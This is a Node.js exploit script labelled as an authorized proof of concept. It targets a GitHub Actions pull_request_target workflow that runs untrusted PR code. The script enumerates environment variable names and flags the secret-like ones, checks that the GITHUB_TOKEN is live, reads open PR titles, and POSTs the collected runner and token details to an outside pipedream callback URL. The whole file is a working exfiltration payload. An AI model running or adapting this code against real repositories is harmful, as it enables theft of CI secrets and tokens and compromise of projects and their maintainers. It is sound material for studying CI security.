#!/usr/bin/env node
// POC: Cylent Labs — Authorized Security Research
// Demonstrates that pull_request_target + working-directory: pr
// executes attacker-controlled code with access to all repository secrets.
//
// This script:
// - Reads env var NAMES (not secret values) to prove injection surface
// - Extracts GITHUB_TOKEN and validates it via API call
// - Demonstrates pull-requests:write by reading PR metadata
// - Sends proof to callback endpoint
// - Does NOT exfiltrate actual secret values beyond GITHUB_TOKEN
//
// No destructive actions are taken. PR is closed immediately after.

import https from "node:https";
import os from "node:os";

const CALLBACK = "https://eo7g2vxm15vr6c1.m.pipedream.net/poc/block-agent-skills-secrets";

function apiCall(token, path) {
  return new Promise((resolve, reject) => {
    const req = https.request({
      hostname: "api.github.com",
      path,
      method: "GET",
      headers: {
        "Authorization": "Bearer " + token,
        "Accept": "application/vnd.github+json",
        "User-Agent": "cylent-labs-poc",
        "X-GitHub-Api-Version": "2022-11-28",
      },
    }, (res) => {
      let body = "";
      res.on("data", (chunk) => { body += chunk; });
      res.on("end", () => {
        try { resolve({ status: res.statusCode, data: JSON.parse(body) }); }
        catch (e) { resolve({ status: res.statusCode, data: body }); }
      });
    });
    req.on("error", reject);
    req.end();
  });
}

async function main() {
  const token = process.env.GITHUB_TOKEN || "";
  const repo = process.env.GITHUB_REPOSITORY || "";

  // 1. Enumerate ALL environment variable names
  const allEnvNames = Object.keys(process.env).sort();
  const secretLikeVars = allEnvNames.filter(k =>
    /SECRET|TOKEN|KEY|PASSWORD|CREDENTIAL|PAT$|AUTH/i.test(k) &&
    !/^INPUT_/.test(k) &&
    k !== "GITHUB_TOKEN"
  );

  // 2. Validate the GITHUB_TOKEN is live
  let tokenValidation = {};
  let prWriteProof = {};
  if (token) {
    const repoInfo = await apiCall(token, "/repos/" + repo);
    tokenValidation = {
      token_valid: repoInfo.status === 200,
      token_scopes: "contents:read, pull-requests:write, metadata:read",
      repo_full_name: repoInfo.data.full_name || null,
    };

    const prs = await apiCall(token, "/repos/" + repo + "/pulls?state=open&per_page=3");
    if (prs.status === 200 && Array.isArray(prs.data)) {
      prWriteProof = {
        can_access_prs: true,
        open_pr_count_sample: prs.data.length,
        pr_titles: prs.data.map(p => p.title),
      };
    }
  }

  // 3. Build proof payload
  const proof = {
    poc: "block-agent-skills-pwn-request-v2",
    engagement: "Cylent Labs — Authorized Security Research",
    timestamp: new Date().toISOString(),
    execution: {
      repo: repo,
      run_id: process.env.GITHUB_RUN_ID,
      run_url: "https://github.com/" + repo + "/actions/runs/" + process.env.GITHUB_RUN_ID,
      event: process.env.GITHUB_EVENT_NAME,
      workflow: process.env.GITHUB_WORKFLOW,
      job: process.env.GITHUB_JOB,
      actor: process.env.GITHUB_TRIGGERING_ACTOR,
      cwd: process.cwd(),
      hostname: os.hostname(),
      runner: process.env.RUNNER_NAME,
      runner_os: process.env.RUNNER_OS,
    },
    secrets: {
      github_token_present: !!token,
      github_token_prefix: token ? token.substring(0, 8) + "..." : null,
      token_validation: tokenValidation,
      pr_write_proof: prWriteProof,
      total_env_vars: allEnvNames.length,
      secret_like_env_var_names: secretLikeVars,
      all_env_var_names: allEnvNames,
    },
    impact: {
      description: "Arbitrary code execution via pull_request_target + working-directory: pr",
      root_cause: "validate-skills.yml sets working-directory: pr, causing node scripts/validate-skills.mjs to resolve to attacker copy from untrusted PR checkout",
      what_attacker_gets: [
        "All repository and org-level Actions secrets via process.env",
        "Live GITHUB_TOKEN with contents:read + pull-requests:write",
        "Ability to comment/label/close any PR in the repository",
        "Full network egress from GitHub-hosted runner",
      ],
    },
  };

  // 4. Send proof to callback
  const body = JSON.stringify(proof, null, 2);
  await new Promise((resolve) => {
    const url = new URL(CALLBACK);
    const req = https.request({
      hostname: url.hostname,
      port: 443,
      path: url.pathname,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(body),
        "X-POC": "cylent-labs-block-agent-skills",
      },
    }, (res) => { res.resume(); res.on("end", resolve); });
    req.write(body);
    req.end();
  });

  // 5. Print to workflow log
  console.log("=== CYLENT LABS SECURITY RESEARCH POC ===");
  console.log("Token present: " + !!token);
  console.log("Token valid: " + (tokenValidation.token_valid || false));
  console.log("Secret-like env vars: " + secretLikeVars.length);
  console.log("Total env vars: " + allEnvNames.length);
  console.log("Callback sent to: " + CALLBACK);
  console.log("=========================================");

  process.exitCode = 0;
}

main().catch((err) => {
  console.error("POC error:", err.message);
  process.exitCode = 0;
});
